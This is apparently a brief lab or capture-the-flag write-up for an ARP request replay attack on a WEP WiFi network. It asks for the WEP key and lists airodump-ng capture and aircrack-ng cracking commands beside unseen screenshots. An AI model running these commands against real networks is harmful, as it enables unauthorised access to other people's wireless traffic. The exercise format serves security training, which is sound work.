# [ARP Request Replay Attack](ARP%20Request%20Replay%20Attack.md)
### Perform the ARP Request Replay attack on the WiFi network. What is the WEP KEY for this network? (Format: xx:xx:xx:xx:xx)

![](Screenshot%202026-09-21%20at%2014.37.31.png)

```sh
airodump-ng wlan0mon -c 1 -w WEP
```

![](Screenshot%202026-09-21%20at%2014.38.16.png)

```sh
aircrack-ng WEP-01-01.cap
```

![](Screenshot%202026-09-21%20at%2014.49.29.png)
